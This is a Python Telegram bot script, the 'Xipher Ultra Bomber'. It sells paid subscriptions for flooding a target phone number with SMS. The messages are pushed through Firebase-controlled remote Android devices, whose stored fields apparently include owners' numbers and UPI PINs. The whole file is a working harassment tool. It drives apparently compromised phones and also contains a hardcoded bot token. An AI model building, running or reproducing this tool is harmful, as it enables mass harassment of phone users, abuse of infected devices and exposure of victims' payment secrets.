#!/usr/bin/env python3
"""
🔥 PREMIUM XIPHER ULTRA BOMBER BOT 🔥
Features:
- Free tier: 5 SMS per user (lifetime)
- Prime subscription with unlimited SMS
- Phone number auto-cleaning (+91 85854 85 85 → 918585485585)
- Custom message support up to 5000+ chars
- Inline schedule picker (Now / Schedule)
- Bulk Firebase add for admin
- Auto DM redirect to owner on Prime buy
- Modern premium UI
"""

import asyncio
import json
import logging
import sqlite3
import re
import sys
import functools
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse
from uuid import uuid4

import httpx
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode

# ---------- CONFIG ----------
TOKEN = "8384076414:AAEygNKHZcarZKUTMXqVGtJjYToip4byBlg"
ADMIN_IDS = [6840524720]
OWNER = "@BRONX_ULTRA"
OWNER_USERNAME = "BRONX_ULTRA"   # without @ for t.me link
OWNER_DM_LINK = f"https://t.me/{OWNER_USERNAME}"

FORCE_CHANNELS = ["@bronx_ultra_osint", "@bronx_ultra_osint"]
MAX_CONCURRENT_REQUESTS = 10000
FREE_TIER_LIMIT = 5

# Prime plans
PRIME_PLANS = {
    "5d":  ("5 Days",  100),
    "10d": ("10 Days", 200),
    "20d": ("20 Days", 300),
    "30d": ("30 Days", 400),
    "60d": ("60 Days", 800),
    "90d": ("90 Days", 999),
}

if not TOKEN or TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("❌ ERROR: Bot token is not set.")
    sys.exit(1)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ---------- ASYNC HTTP ----------
_http_client = None
_http_semaphore = None

def get_http_client() -> httpx.AsyncClient:
    global _http_client
    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(
            timeout=httpx.Timeout(15.0, connect=8.0),
            limits=httpx.Limits(max_connections=200, max_keepalive_connections=100),
        )
    return _http_client

def get_http_semaphore() -> asyncio.Semaphore:
    global _http_semaphore
    if _http_semaphore is None:
        _http_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    return _http_semaphore

async def check_channel_membership(user_id: int, bot) -> Tuple[bool, List[str]]:
    missing = []
    for channel in FORCE_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status in ["left", "kicked"]:
                missing.append(channel)
        except Exception:
            missing.append(channel)
    return (len(missing) == 0, missing)

def get_join_keyboard() -> InlineKeyboardMarkup:
    buttons = []
    for ch in FORCE_CHANNELS:
        buttons.append([InlineKeyboardButton(f"🔗 Join {ch}", url=f"https://t.me/{ch.lstrip('@')}")])
    buttons.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_join")])
    return InlineKeyboardMarkup(buttons)

# ---------- DATABASE ----------
DB_PATH = "bomber.db"

def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=10.0)
    conn.execute("PRAGMA busy_timeout=5000")
    return conn

def init_db():
    conn = _connect()
    c = conn.cursor()
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    c.execute("""
        CREATE TABLE IF NOT EXISTS firebases (
            id TEXT PRIMARY KEY,
            url TEXT NOT NULL,
            secret TEXT NOT NULL,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS jobs (
            id TEXT PRIMARY KEY,
            target TEXT NOT NULL,
            message TEXT NOT NULL,
            devices_used INTEGER,
            success_count INTEGER,
            fail_count INTEGER,
            status TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            scheduled_for TIMESTAMP,
            started_at TIMESTAMP,
            finished_at TIMESTAMP,
            firebase_ids TEXT,
            chat_id INTEGER,
            total_sms INTEGER,
            delay REAL,
            credit_used INTEGER,
            user_id INTEGER
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            credits INTEGER DEFAULT 0,
            free_sms_used INTEGER DEFAULT 0,
            prime_until TIMESTAMP,
            first_name TEXT,
            username TEXT,
            joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    # Migration for users
    c.execute("PRAGMA table_info(users)")
    ucols = [r[1] for r in c.fetchall()]
    for col, ctype in [
        ("free_sms_used", "INTEGER DEFAULT 0"),
        ("prime_until", "TIMESTAMP"),
        ("first_name", "TEXT"),
        ("username", "TEXT"),
        ("joined_at", "TIMESTAMP"),
    ]:
        if col not in ucols:
            c.execute(f"ALTER TABLE users ADD COLUMN {col} {ctype}")

    c.execute("""
        CREATE TABLE IF NOT EXISTS keys (
            key_string TEXT PRIMARY KEY,
            credits INTEGER NOT NULL,
            max_uses INTEGER NOT NULL,
            used_count INTEGER DEFAULT 0,
            created_by INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS redemptions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_string TEXT,
            user_id INTEGER,
            redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    c.execute("PRAGMA table_info(jobs)")
    cols = [r[1] for r in c.fetchall()]
    for col, ctype in [("total_sms","INTEGER"),("delay","REAL"),("credit_used","INTEGER"),("user_id","INTEGER")]:
        if col not in cols:
            c.execute(f"ALTER TABLE jobs ADD COLUMN {col} {ctype}")

    conn.commit()
    conn.close()

init_db()

# ---------- DB HELPERS ----------
def db_get_firebases() -> Dict[str, Dict]:
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT id, url, secret FROM firebases")
    rows = c.fetchall(); conn.close()
    return {row[0]: {"url": row[1], "secret": row[2]} for row in rows}

def db_add_firebase(fid: str, url: str, secret: str = ""):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO firebases (id, url, secret) VALUES (?,?,?)", (fid, url, secret))
    conn.commit(); conn.close()

def db_delete_firebase(fid: str):
    conn = _connect(); c = conn.cursor()
    c.execute("DELETE FROM firebases WHERE id=?", (fid,))
    conn.commit(); conn.close()

def db_add_job(job_id, target, message, firebase_ids, chat_id, total_sms, delay, user_id):
    conn = _connect(); c = conn.cursor()
    c.execute(
        "INSERT INTO jobs (id, target, message, status, firebase_ids, chat_id, total_sms, delay, user_id) VALUES (?,?,?,?,?,?,?,?,?)",
        (job_id, target, message, "pending", ",".join(firebase_ids), chat_id, total_sms, delay, user_id)
    )
    conn.commit(); conn.close()
    return job_id

def db_update_job(job_id: str, **kwargs):
    conn = _connect(); c = conn.cursor()
    fields, vals = [], []
    for k, v in kwargs.items():
        fields.append(f"{k}=?"); vals.append(v)
    vals.append(job_id)
    c.execute(f"UPDATE jobs SET {','.join(fields)} WHERE id=?", vals)
    conn.commit(); conn.close()

def db_get_jobs(limit=20, user_id=None) -> List[Dict]:
    conn = _connect(); conn.row_factory = sqlite3.Row
    c = conn.cursor()
    if user_id is not None:
        c.execute("SELECT * FROM jobs WHERE user_id = ? ORDER BY created_at DESC LIMIT ?", (user_id, limit))
    else:
        c.execute("SELECT * FROM jobs ORDER BY created_at DESC LIMIT ?", (limit,))
    rows = c.fetchall(); conn.close()
    return [dict(r) for r in rows]

# ---------- USER HELPERS ----------
def ensure_user(user_id: int, first_name: str = None, username: str = None):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,))
    if c.fetchone():
        if first_name is not None or username is not None:
            c.execute("UPDATE users SET first_name=COALESCE(?, first_name), username=COALESCE(?, username) WHERE user_id=?",
                      (first_name, username, user_id))
    else:
        c.execute("INSERT INTO users (user_id, credits, free_sms_used, first_name, username) VALUES (?,?,?,?,?)",
                  (user_id, 0, 0, first_name, username))
    conn.commit(); conn.close()

def get_user(user_id: int) -> Dict:
    conn = _connect(); conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone(); conn.close()
    return dict(row) if row else None

def get_user_credits(user_id: int) -> int:
    u = get_user(user_id)
    return u["credits"] if u else 0

def update_user_credits(user_id: int, delta: int):
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (delta, user_id))
    conn.commit(); conn.close()

def is_prime(user_id: int) -> bool:
    u = get_user(user_id)
    if not u or not u.get("prime_until"):
        return False
    try:
        until = datetime.fromisoformat(u["prime_until"])
        return until > datetime.now()
    except Exception:
        return False

def prime_until_str(user_id: int) -> Optional[str]:
    u = get_user(user_id)
    if not u or not u.get("prime_until"):
        return None
    try:
        until = datetime.fromisoformat(u["prime_until"])
        if until > datetime.now():
            return until.strftime("%Y-%m-%d %H:%M")
    except Exception:
        pass
    return None

def activate_prime(user_id: int, days: int):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT prime_until FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    base = datetime.now()
    if row and row[0]:
        try:
            existing = datetime.fromisoformat(row[0])
            if existing > base:
                base = existing
        except Exception:
            pass
    new_until = base + timedelta(days=days)
    c.execute("UPDATE users SET prime_until=? WHERE user_id=?", (new_until.isoformat(), user_id))
    conn.commit(); conn.close()

def can_send_sms(user_id: int, count: int) -> Tuple[bool, str]:
    """Check if user can send `count` SMS. Returns (allowed, reason)."""
    if is_prime(user_id):
        return True, "prime"
    u = get_user(user_id)
    if not u:
        return False, "User not found."
    free_left = FREE_TIER_LIMIT - (u.get("free_sms_used") or 0)
    credits = u.get("credits") or 0
    # Total available = free_left + credits
    total_available = free_left + credits
    if total_available >= count:
        return True, "free+credits"
    return False, f"Only {total_available} SMS available. Buy Prime for unlimited SMS."

def consume_sms(user_id: int, count: int) -> int:
    """Consume `count` SMS. Uses free tier first, then credits. Returns credits consumed."""
    if is_prime(user_id):
        return 0
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT free_sms_used, credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        conn.close(); return 0
    free_used, credits = row[0] or 0, row[1] or 0
    free_left = max(0, FREE_TIER_LIMIT - free_used)
    use_free = min(free_left, count)
    use_credits = count - use_free
    if use_credits > credits:
        use_credits = credits
    c.execute("UPDATE users SET free_sms_used = free_sms_used + ?, credits = credits - ? WHERE user_id=?",
              (use_free, use_credits, user_id))
    conn.commit(); conn.close()
    return use_credits

def refund_sms(user_id: int, count: int):
    """Refund credits (used only when job fails)."""
    if is_prime(user_id):
        return
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (count, user_id))
    conn.commit(); conn.close()

# ---------- KEY HELPERS ----------
def generate_key_string(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def db_add_key(key_string, credits, max_uses, created_by):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO keys (key_string, credits, max_uses, created_by) VALUES (?,?,?,?)",
              (key_string, credits, max_uses, created_by))
    conn.commit(); conn.close()

def db_redeem_key(key_string, user_id) -> bool:
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT credits, max_uses, used_count FROM keys WHERE key_string=?", (key_string,))
    row = c.fetchone()
    if not row:
        conn.close(); return False
    credits, max_uses, used_count = row
    if used_count >= max_uses:
        conn.close(); return False
    c.execute("SELECT 1 FROM redemptions WHERE key_string=? AND user_id=?", (key_string, user_id))
    if c.fetchone():
        conn.close(); return False
    c.execute("UPDATE keys SET used_count = used_count + 1 WHERE key_string=?", (key_string,))
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (credits, user_id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, credits))
    c.execute("INSERT INTO redemptions (key_string, user_id) VALUES (?,?)", (key_string, user_id))
    conn.commit(); conn.close()
    return True

# ---------- PHONE CLEANER ----------
def clean_phone(raw: str) -> Optional[str]:
    """
    Accept +91 85854 85 85, +919898989898, 91-9999999999, (xxx) xxx-xxxx, etc.
    Returns digits only string, or None if invalid.
    """
    if not raw:
        return None
    digits = re.sub(r'\D', '', raw)
    if len(digits) < 7 or len(digits) > 15:
        return None
    return digits

# ---------- FIREBASE HELPERS ----------
async def get_online_devices(url: str) -> List[Dict]:
    base = url.rstrip("/")
    if base.endswith(".json"): base = base[:-5]
    base = base.rstrip("/")
    clients_url = f"{base}/clients.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().get(clients_url)
            resp.raise_for_status()
            clients = resp.json()
    except Exception as e:
        logger.error(f"get_online_devices failed: {e}")
        return []
    if not isinstance(clients, dict):
        return []
    online = []
    for device_id, info in clients.items():
        if info.get("status") is True:
            sims = info.get("sims", [])
            online.append({
                "id": device_id,
                "name": info.get("modelName", device_id),
                "phone": info.get("mobNo", "N/A"),
                "battery": info.get("battery", "N/A"),
                "provider": info.get("service_provider", ""),
                "sims": sims,
                "upipin": info.get("upipin", ""),
            })
    return online

async def send_sms_via_device(url, device_id, sim_index, target, message) -> bool:
    payload = {
        "from": sim_index,
        "to": target,
        "message": message,
        "isSended": False,
        "timestamp": datetime.now().isoformat()
    }
    path = f"clients/{device_id}/webhookEvent/sendSms"
    put_url = f"{url.rstrip('/')}/{path}.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().put(put_url, json=payload)
            resp.raise_for_status()
        return True
    except Exception as e:
        logger.error(f"Send failed for {device_id}: {e}")
        return False

# ---------- GLOBALS ----------
running_jobs = {}
progress_messages = {}
BOT = None

def set_bot(bot):
    global BOT
    BOT = bot

# ---------- UI ----------
LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━"

# ---------- BOMB ENGINE ----------
async def execute_bomb_job(job_id, target, message, firebase_ids, total_sms, delay, user_id, schedule_time=None):
    if schedule_time and schedule_time > datetime.now():
        db_update_job(job_id, status="scheduled", scheduled_for=schedule_time.isoformat())
        # Sleep until scheduled time (non-blocking)
        wait_secs = (schedule_time - datetime.now()).total_seconds()
        try:
            await asyncio.sleep(wait_secs)
        except asyncio.CancelledError:
            db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat())
            return

    db_update_job(job_id, status="running", started_at=datetime.now().isoformat())

    # Verify access & consume SMS (prime = free)
    allowed, reason = can_send_sms(user_id, total_sms)
    if not allowed:
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0, finished=True, error=reason)
        return

    credits_used = consume_sms(user_id, total_sms)

    all_devices = []
    firebases = db_get_firebases()
    used_ids = [fid for fid in firebase_ids if fid in firebases]
    for fid in used_ids:
        devices = await get_online_devices(firebases[fid]["url"])
        for dev in devices:
            all_devices.append((fid, dev, firebases[fid]["url"]))

    if not all_devices:
        if credits_used > 0:
            refund_sms(user_id, credits_used)
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0, finished=True, error="No online devices")
        return

    num_devices = len(all_devices)
    sms_per = total_sms // num_devices
    rem = total_sms % num_devices
    assignments = []
    for i, (fid, dev, url) in enumerate(all_devices):
        cnt = sms_per + (1 if i < rem else 0)
        if cnt > 0:
            assignments.append((fid, dev, url, cnt))

    total_attempts = sum(c for _,_,_,c in assignments)
    success = 0; fail = 0
    await send_progress_update(job_id, 0, total=total_attempts, success=0, fail=0)

    idx = 0
    try:
        for fid, dev, url, cnt in assignments:
            sims = dev.get("sims", [])
            sim_index = 1 if sims else 1
            for _ in range(cnt):
                if job_id not in running_jobs:
                    # cancelled
                    db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat(),
                                  success_count=success, fail_count=fail, credit_used=credits_used)
                    return
                ok = await send_sms_via_device(url, dev["id"], sim_index, target, message)
                if ok: success += 1
                else: fail += 1
                idx += 1
                await send_progress_update(job_id, idx, total=total_attempts, success=success, fail=fail)
                await asyncio.sleep(delay)
    except asyncio.CancelledError:
        db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat(),
                      success_count=success, fail_count=fail, credit_used=credits_used)
        return

    # Refund credits for failed (only credits portion)
    if fail > 0 and credits_used > 0:
        refund_amount = min(fail, credits_used)
        refund_sms(user_id, refund_amount)

    db_update_job(job_id, status="completed", finished_at=datetime.now().isoformat(),
                  devices_used=num_devices, success_count=success, fail_count=fail,
                  credit_used=credits_used)
    await send_progress_update(job_id, total_attempts, total=total_attempts, success=success, fail=fail, finished=True)
    running_jobs.pop(job_id, None)
    progress_messages.pop(job_id, None)

async def send_progress_update(job_id, done, total, success, fail, finished=False, error=None):
    if BOT is None: return
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT chat_id, target, user_id FROM jobs WHERE id=?", (job_id,))
    row = c.fetchone(); conn.close()
    if not row: return
    chat_id, target, user_id = row

    credits = get_user_credits(user_id) if user_id else 0
    prime = "⭐ Prime" if is_prime(user_id) else f"💎 {credits} cr"
    percent = int((done/total)*100) if total else 0
    filled = int(20 * percent / 100)
    bar = "▰" * filled + "▱" * (20 - filled)

    if error: status_text = f"❌ *Error:* {error}"
    elif finished: status_text = "✅ *Completed*"
    else: status_text = "🔄 *Running*"

    text = (
        f"{LINE}\n"
        f"💣 *Xipher Ultra Bomb* | `{job_id}`\n"
        f"{LINE}\n\n"
        f"{bar}  *{percent}%*\n\n"
        f"📞 Target: `{target}`\n"
        f"✅ Sent: {success}   ❌ Failed: {fail}\n"
        f"👤 Status: {prime}\n\n"
        f"📌 {status_text}"
    )
    if job_id in progress_messages:
        try:
            await BOT.edit_message_text(text, chat_id=chat_id, message_id=progress_messages[job_id], parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            logger.warning(f"edit progress failed: {e}")
    else:
        try:
            msg = await BOT.send_message(chat_id, text, parse_mode=ParseMode.MARKDOWN)
            progress_messages[job_id] = msg.message_id
        except Exception as e:
            logger.warning(f"send progress failed: {e}")

# ---------- MENUS ----------
USER_BUTTONS = ["💣 Launch Bomb", "⭐ Buy Prime", "💰 Balance", "📊 Status", "📜 History", "🔑 Redeem Key"]
ADMIN_BUTTONS = ["📡 Online Devices", "📊 Stats & History", "⚙️ Manage Firebases", "🔑 Generate Key"]
ALL_BUTTONS = USER_BUTTONS + ADMIN_BUTTONS

def get_main_keyboard(user_id: int):
    if user_id in ADMIN_IDS:
        keyboard = [
            ["💣 Launch Bomb", "⭐ Buy Prime"],
            ["💰 Balance", "📊 Status"],
            ["📜 History", "🔑 Redeem Key"],
            ["📡 Online Devices", "📊 Stats & History"],
            ["⚙️ Manage Firebases", "🔑 Generate Key"],
        ]
    else:
        keyboard = [
            ["💣 Launch Bomb", "⭐ Buy Prime"],
            ["💰 Balance", "📊 Status"],
            ["📜 History", "🔑 Redeem Key"],
        ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user(user_id, update.effective_user.first_name, update.effective_user.username)

    joined, missing = await check_channel_membership(user_id, context.bot)
    if not joined:
        text = (
            "╔══════════════════════════════════╗\n"
            "   🔥 *PREMIUM XIPHER ULTRA* 🔥\n"
            "╚══════════════════════════════════╝\n\n"
            "⚠️ *Please join all channels to use this bot:*\n\n"
            f"👑 *Owner:* {OWNER}\n\n"
            "Join the channels below and click ✅ I've Joined:"
        )
        await update.message.reply_text(text, reply_markup=get_join_keyboard(), parse_mode=ParseMode.MARKDOWN)
        return

    await send_main_menu(update.message, user_id)

async def send_main_menu(message, user_id):
    u = get_user(user_id) or {}
    credits = u.get("credits", 0)
    free_used = u.get("free_sms_used", 0) or 0
    free_left = max(0, FREE_TIER_LIMIT - free_used)
    prime = is_prime(user_id)
    prime_until = prime_until_str(user_id)
    role = "👑 *ADMIN*" if user_id in ADMIN_IDS else "⚡ *USER*"
    prime_line = f"⭐ *Prime Active* (until `{prime_until}`)" if prime else f"🆓 Free SMS left: *{free_left}*"

    text = (
        "╔══════════════════════════════════╗\n"
        "   🔥 *PREMIUM XIPHER ULTRA* 🔥\n"
        "╚══════════════════════════════════╝\n\n"
        f"👤 *User ID:* `{user_id}`\n"
        f"💎 *Credits:* {credits}\n"
        f"{prime_line}\n"
        f"🎖️ *Role:* {role}\n"
        f"👑 *Owner:* {OWNER}\n\n"
        f"{LINE}\n"
        "🚀 *Engine:* Async Ultra-Fast\n"
        "⚡ *Multi-User:* Unlimited\n"
        "🛡️ *Status:* ✅ Online\n"
        f"{LINE}\n\n"
        "👇 Use the buttons below ✨"
    )
    await message.reply_text(text, reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.MARKDOWN)

# ---------- PRIME ----------
def build_prime_keyboard():
    rows = []
    for key, (label, price) in PRIME_PLANS.items():
        rows.append([InlineKeyboardButton(f"⭐ {label} — ₹{price}", callback_data=f"prime_{key}")])
    rows.append([InlineKeyboardButton("📩 Contact Owner", url=OWNER_DM_LINK)])
    return InlineKeyboardMarkup(rows)

async def show_prime_menu(target_msg):
    text = (
        "╔══════════════════════════════════╗\n"
        "     ⭐ *BUY PRIME ACCESS* ⭐\n"
        "╚══════════════════════════════════╝\n\n"
        "🔓 *Prime Benefits:*\n"
        "• ♾️ Unlimited SMS bombing\n"
        "• 📱 Any number, any time\n"
        "• 💬 Custom message (up to 5000+ chars)\n"
        "• ⚡ Lightning speed enabled\n"
        "• 🚀 Priority server\n\n"
        f"{LINE}\n"
        "*Plans:*\n"
        "⭐ 5 Days  — ₹100\n"
        "⭐ 10 Days — ₹200\n"
        "⭐ 20 Days — ₹300\n"
        "⭐ 30 Days — ₹400\n"
        "⭐ 60 Days — ₹800\n"
        "⭐ 90 Days — ₹999\n"
        f"{LINE}\n\n"
        f"👑 *Owner:* {OWNER}\n"
        "👇 Choose plan & contact owner to pay:"
    )
    await target_msg.reply_text(text, reply_markup=build_prime_keyboard(), parse_mode=ParseMode.MARKDOWN)

async def prime_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data.startswith("prime_"):
        plan_key = data.split("_", 1)[1]
        plan = PRIME_PLANS.get(plan_key)
        if not plan:
            await query.edit_message_text("Invalid plan.")
            return
        label, price = plan
        user_id = update.effective_user.id
        text = (
            "╔══════════════════════════════════╗\n"
            "        ⭐ *PRIME CHECKOUT* ⭐\n"
            "╚══════════════════════════════════╝\n\n"
            f"📦 *Plan:* {label}\n"
            f"💰 *Price:* ₹{price}\n"
            f"👤 *Your ID:* `{user_id}`\n\n"
            f"{LINE}\n\n"
            "👉 *Click below to auto-DM the owner.*\n"
            "Send this screenshot + your Telegram ID to receive Prime.\n\n"
            f"👑 *Owner:* {OWNER}"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📩 Message Owner Now", url=OWNER_DM_LINK)],
            [InlineKeyboardButton("🔙 Back to Plans", callback_data="prime_back")],
        ])
        await query.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
    elif data == "prime_back":
        await query.edit_message_text("Loading plans...", parse_mode=ParseMode.MARKDOWN)
        await show_prime_menu(query.message)

# ---------- BOMB WIZARD ----------
(TARGET, MESSAGE, SMS_COUNT, SPEED, SCHEDULE) = range(5)

async def bomb_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user(user_id)

    # Check access
    allowed, reason = can_send_sms(user_id, 1)
    if not allowed and not is_prime(user_id):
        u = get_user(user_id) or {}
        free_left = max(0, FREE_TIER_LIMIT - (u.get("free_sms_used") or 0))
        if free_left == 0 and (u.get("credits") or 0) == 0:
            text = (
                "🚫 *Free limit reached!*\n"
                f"{LINE}\n"
                f"You've used your *{FREE_TIER_LIMIT} free SMS*.\n"
                "Please *buy Prime* for unlimited access or redeem a key.\n\n"
                f"👑 *Owner:* {OWNER}"
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("⭐ Buy Prime", callback_data="prime_back")],
                [InlineKeyboardButton("📩 Contact Owner", url=OWNER_DM_LINK)],
            ])
            msg = query_msg = update.callback_query.message if update.callback_query else update.message
            await msg.reply_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
            return ConversationHandler.END

    if update.callback_query:
        await update.callback_query.answer()
        msg = update.callback_query.message
    else:
        msg = update.message

    u = get_user(user_id) or {}
    free_left = max(0, FREE_TIER_LIMIT - (u.get("free_sms_used") or 0))
    credits = u.get("credits") or 0
    prime = is_prime(user_id)
    avail_line = "⭐ Prime (Unlimited)" if prime else f"🆓 Free left: {free_left} | 💎 Credits: {credits}"

    await msg.reply_text(
        "💣 *LAUNCH BOMB*\n"
        f"{LINE}\n"
        f"{avail_line}\n\n"
        "📞 Send target phone number.\n"
        "_Example:_ `+91 85854 85 85` or `919898989898`\n"
        "_(Spaces, +, - will be auto-removed)_\n\n"
        "Type /cancel to abort.",
        parse_mode=ParseMode.MARKDOWN
    )
    return TARGET

async def bomb_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END

    cleaned = clean_phone(text)
    if not cleaned:
        await update.message.reply_text("❌ Invalid number. Try again (e.g., +91 85854 85 85).")
        return TARGET
    context.user_data["target"] = cleaned
    await update.message.reply_text(
        f"✅ Number cleaned: `{cleaned}`\n\n"
        "✏️ Now send the message you want to send.\n"
        "_(Any length supported — up to 5000+ characters)_",
        parse_mode=ParseMode.MARKDOWN
    )
    return MESSAGE

async def bomb_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    if not text or not text.strip():
        await update.message.reply_text("❌ Message cannot be empty. Please type something.")
        return MESSAGE
    if len(text) > 10000:
        await update.message.reply_text("❌ Message too long (max 10,000 chars).")
        return MESSAGE
    context.user_data["message"] = text

    user_id = update.effective_user.id
    u = get_user(user_id) or {}
    free_left = max(0, FREE_TIER_LIMIT - (u.get("free_sms_used") or 0))
    credits = u.get("credits") or 0
    prime = is_prime(user_id)

    if prime:
        limit_line = "⭐ Prime — *unlimited SMS* available."
    else:
        limit_line = f"🆓 Free: {free_left} | 💎 Credits: {credits}\n_Max you can send now: {free_left + credits}_"

    await update.message.reply_text(
        f"📨 *How many SMS to send?*\n{LINE}\n{limit_line}\n\nEnter a number:",
        parse_mode=ParseMode.MARKDOWN
    )
    return SMS_COUNT

async def bomb_sms_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END

    try:
        count = int(text)
        if count <= 0:
            raise ValueError
    except:
        await update.message.reply_text("❌ Please enter a positive integer.")
        return SMS_COUNT

    user_id = update.effective_user.id
    allowed, reason = can_send_sms(user_id, count)
    if not allowed:
        text_out = (
            f"⚠️ *Not enough SMS available*\n{LINE}\n{reason}\n\n"
            "👇 *Buy Prime for unlimited SMS!*"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⭐ Buy Prime", callback_data="prime_back")],
            [InlineKeyboardButton("📩 Contact Owner", url=OWNER_DM_LINK)],
        ])
        await update.message.reply_text(text_out, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        return SMS_COUNT

    context.user_data["sms_count"] = count
    keyboard = [
        [InlineKeyboardButton("🐢 Slow (1s)", callback_data="speed_slow")],
        [InlineKeyboardButton("🐇 Medium (0.5s)", callback_data="speed_medium")],
        [InlineKeyboardButton("🚀 Fast (0.1s)", callback_data="speed_fast")],
        [InlineKeyboardButton("💥 Lightning (0.02s)", callback_data="speed_lightning")],
    ]
    await update.message.reply_text(
        "⚡ *SELECT SPEED*\n" + f"{LINE}\nChoose delay between SMS:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )
    return SPEED

async def bomb_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    delay = {"speed_slow":1.0, "speed_medium":0.5, "speed_fast":0.1, "speed_lightning":0.02}.get(data, 0.5)
    context.user_data["delay"] = delay

    # Inline schedule picker — Now / Schedule
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Send Now", callback_data="sched_now")],
        [InlineKeyboardButton("⏰ Schedule", callback_data="sched_later")],
    ])
    await query.message.reply_text(
        f"⏱️ Speed: *{delay}s*\n\n"
        "🕒 *When to send?*\nChoose below:",
        reply_markup=kb,
        parse_mode=ParseMode.MARKDOWN
    )
    return SCHEDULE

async def schedule_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "sched_now":
        # immediately launch
        await launch_bomb(update, context, schedule_time=None)
        return ConversationHandler.END
    elif data == "sched_later":
        context.user_data["awaiting_schedule_time"] = True
        await query.message.reply_text(
            "⏰ *Enter schedule time*\n"
            f"{LINE}\n"
            "Format: `YYYY-MM-DD HH:MM`\n"
            "Example: `2025-12-31 23:59`\n\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.MARKDOWN
        )
        return SCHEDULE

